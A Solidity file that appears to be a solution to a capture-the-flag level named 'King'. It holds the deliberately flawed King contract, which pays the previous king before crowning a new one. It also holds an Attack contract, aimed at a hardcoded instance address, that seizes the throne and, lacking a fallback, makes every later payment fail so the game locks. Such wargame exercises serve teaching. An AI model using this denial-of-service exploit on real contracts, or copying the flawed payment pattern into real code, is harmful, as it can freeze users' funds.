// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract King {

  address payable king;
  uint public prize;
  address payable public owner;

  constructor() public payable {
    owner = msg.sender;  
    king = msg.sender;
    prize = msg.value;
  }

  receive() external payable {
    require(msg.value >= prize || msg.sender == owner);
    king.transfer(msg.value);
    king = msg.sender;
    prize = msg.value;
  }

  function _king() public view returns (address payable) {
    return king;
  }
}



contract Attack {

    King public king;

    constructor() public payable {
        king = King(0x507B999610D004CEe80B628B4052A6fbe0E2a77d);
    }

    function becomeKing() public payable {
        (bool success, ) = address(king).call{value: address(this).balance}("");
        require(success, "Failed to become king");
    }

    // No fallback function defined, level contract can't become king
}